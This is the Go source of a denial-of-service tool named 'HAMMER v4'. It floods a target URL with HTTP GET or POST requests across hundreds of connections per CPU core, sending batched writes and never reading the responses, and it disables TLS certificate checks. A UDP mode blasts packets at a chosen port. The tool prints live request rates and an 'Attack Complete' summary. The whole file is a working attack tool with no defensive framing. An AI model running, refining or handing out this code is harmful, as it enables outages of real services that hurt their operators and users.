package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var (
	sentTotal   int64
	failedTotal int64
	startTime   time.Time
	stopFlag    int32 // 0 = running, 1 = stop
)

func buildRequest(method, host, path, body string) ([]byte, []byte) {
	var clen int
	var hasBody bool
	if method == "POST" && body != "" {
		clen = len(body)
		hasBody = true
	}

	est := len(method) + len(path) + len(host) + 128
	if hasBody {
		est += clen + 64
	}
	buf := make([]byte, 0, est)

	buf = append(buf, method...)
	buf = append(buf, ' ')
	buf = append(buf, path...)
	buf = append(buf, " HTTP/1.0\r\n"...)
	buf = append(buf, "Host: "...)
	buf = append(buf, host...)
	buf = append(buf, "\r\n"...)
	buf = append(buf, "User-Agent: Mozilla/5.0\r\n"...)
	buf = append(buf, "Accept: */*\r\n"...)
	buf = append(buf, "Connection: keep-alive\r\n"...)
	if hasBody {
		buf = append(buf, "Content-Type: application/x-www-form-urlencoded\r\n"...)
		buf = append(buf, "Content-Length: "...)
		buf = strconv.AppendInt(buf, int64(clen), 10)
		buf = append(buf, "\r\n"...)
	}
	buf = append(buf, "\r\n"...)
	if hasBody {
		buf = append(buf, body...)
	}

	// Build a batch of 5 concatenated requests for write coalescing
	batch := make([]byte, 0, len(buf)*5)
	for i := 0; i < 5; i++ {
		batch = append(batch, buf...)
	}

	return buf, batch
}

func dialConn(scheme, host, port string) (net.Conn, error) {
	addr := net.JoinHostPort(host, port)
	if scheme == "https" {
		conf := &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS10}
		return tls.Dial("tcp", addr, conf)
	}
	return net.DialTimeout("tcp", addr, 10*time.Second)
}

func workerSingleConn(req, batch []byte, scheme, host, port string, wg *sync.WaitGroup, ls, lf *int64) {
	defer wg.Done()

	c, err := dialConn(scheme, host, port)
	if err != nil {
		atomic.AddInt64(lf, 1)
		return
	}
	defer c.Close()

	iter := 0
	for atomic.LoadInt32(&stopFlag) == 0 {
		// Use batch every 5 iterations, single request otherwise
		var buf []byte
		if iter%5 == 0 {
			buf = batch
		} else {
			buf = req
		}

		_, err := c.Write(buf)
		if err != nil {
			atomic.AddInt64(lf, 1)
			// reconnect
			c.Close()
			c, err = dialConn(scheme, host, port)
			if err != nil {
				return
			}
			continue
		}
		// Count based on batch size
		if iter%5 == 0 {
			atomic.AddInt64(ls, 5)
		} else {
			atomic.AddInt64(ls, 1)
		}
		iter++
	}
}

func statsReporter(stop <-chan struct{}) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	var prev int64
	for {
		select {
		case <-stop:
			return
		case <-ticker.C:
			current := atomic.LoadInt64(&sentTotal)
			rps := current - prev
			prev = current
			fails := atomic.LoadInt64(&failedTotal)
			elapsed := time.Since(startTime).Seconds()
			fmt.Printf("\r[+] RPS: %-10d | Total: %-14d | Failed: %-10d | Elapsed: %-6.1fs | Goroutines: %d  ",
				rps, current, fails, elapsed, runtime.NumGoroutine())
		}
	}
}

func udpFlood(targetIP string, port int, threads int, duration time.Duration, size int) {
	var wg sync.WaitGroup
	payload := make([]byte, size)
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP(targetIP), Port: port})
			if err != nil {
				return
			}
			defer conn.Close()
			for atomic.LoadInt32(&stopFlag) == 0 {
				conn.Write(payload)
				atomic.AddInt64(&sentTotal, 1)
			}
		}()
	}
	wg.Wait()
}

func main() {
	target := flag.String("target", "", "Target URL")
	method := flag.String("method", "GET", "HTTP method")
	threads := flag.Int("threads", runtime.NumCPU()*200, "Number of goroutines (1 conn each)")
	duration := flag.Int("duration", 30, "Attack duration in seconds")
	body := flag.String("body", "", "POST body data")
	path := flag.String("path", "", "Custom URL path")
	udp := flag.Bool("udp", false, "UDP flood mode")
	udpPort := flag.Int("udp-port", 80, "UDP target port")
	udpSize := flag.Int("udp-size", 1400, "UDP payload size")
	flag.Parse()

	fmt.Printf(`
  ╔═══════════════════════════════════════════════╗
  ║          HAMMER v4 — MAX THROUGHPUT           ║
  ║       Fire-and-Forget · No Response Drain     ║
  ╚═══════════════════════════════════════════════╝
`)

	if *target == "" {
		fmt.Println("Usage: ./hammer -target <url> [options]")
		flag.PrintDefaults()
		os.Exit(1)
	}

	runtime.GOMAXPROCS(runtime.NumCPU())
	startTime = time.Now()

	if *udp {
		u, err := url.Parse(*target)
		if err != nil {
			fmt.Println("Invalid URL:", err)
			os.Exit(1)
		}
		ips, err := net.LookupHost(u.Hostname())
		if err != nil {
			fmt.Println("DNS lookup failed:", err)
			os.Exit(1)
		}
		ip := ips[0]
		fmt.Printf("[✓] UDP Mode\n")
		fmt.Printf("[✓] Target IP:   %s:%d\n", ip, *udpPort)
		fmt.Printf("[✓] Workers:     %d\n", *threads)
		fmt.Printf("[✓] Duration:    %ds\n", *duration)
		fmt.Println(strings.Repeat("─", 50))

		stopStats := make(chan struct{})
		go statsReporter(stopStats)

		time.AfterFunc(time.Duration(*duration)*time.Second, func() {
			atomic.StoreInt32(&stopFlag, 1)
		})

		udpFlood(ip, *udpPort, *threads, time.Duration(*duration)*time.Second, *udpSize)
		close(stopStats)
	} else {
		u, err := url.Parse(*target)
		if err != nil {
			fmt.Println("Invalid URL:", err)
			os.Exit(1)
		}
		scheme := u.Scheme
		host := u.Hostname()
		port := u.Port()
		if port == "" {
			if scheme == "https" {
				port = "443"
			} else {
				port = "80"
			}
		}
		rp := *path
		if rp == "" {
			rp = u.Path
			if rp == "" {
				rp = "/"
			}
		}

		reqSingle, reqBatch := buildRequest(*method, host, rp, *body)
		totalWorkers := *threads

		fmt.Printf("[✓] Target:      %s://%s:%s%s\n", scheme, host, port, rp)
		fmt.Printf("[✓] Method:      %s\n", *method)
		fmt.Printf("[✓] Workers:     %d (1 conn each)\n", totalWorkers)
		fmt.Printf("[✓] Duration:    %ds\n", *duration)
		fmt.Printf("[✓] CPU Cores:   %d\n", runtime.NumCPU())
		fmt.Printf("[✓] Request Sz:  %d bytes\n", len(reqSingle))
		if scheme == "https" {
			fmt.Printf("[✓] TLS:         enabled\n")
		}
		fmt.Println(strings.Repeat("─", 50))

		stopStats := make(chan struct{})
		go statsReporter(stopStats)

		var wg sync.WaitGroup
		for w := 0; w < totalWorkers; w++ {
			wg.Add(1)
			ls := new(int64)
			lf := new(int64)
			go func(localSent, localFailed *int64) {
				workerSingleConn(reqSingle, reqBatch, scheme, host, port, &wg, localSent, localFailed)
				atomic.AddInt64(&sentTotal, *localSent)
				atomic.AddInt64(&failedTotal, *localFailed)
			}(ls, lf)
		}

		time.Sleep(time.Duration(*duration) * time.Second)
		atomic.StoreInt32(&stopFlag, 1)
		fmt.Println("\n[!] Draining...")
		wg.Wait()
		close(stopStats)
	}

	elapsed := time.Since(startTime).Seconds()
	total := atomic.LoadInt64(&sentTotal)
	fails := atomic.LoadInt64(&failedTotal)
	fmt.Printf("\n\n┌─ Attack Complete ──────────────────────────┐\n")
	fmt.Printf("│ Total Requests:  %-32d │\n", total)
	fmt.Printf("│ Failed:          %-32d │\n", fails)
	fmt.Printf("│ Avg RPS:         %-32.0f │\n", float64(total)/elapsed)
	fmt.Printf("│ Duration:        %-32.2fs │\n", elapsed)
	fmt.Printf("└──────────────────────────────────────────────┘\n")
}

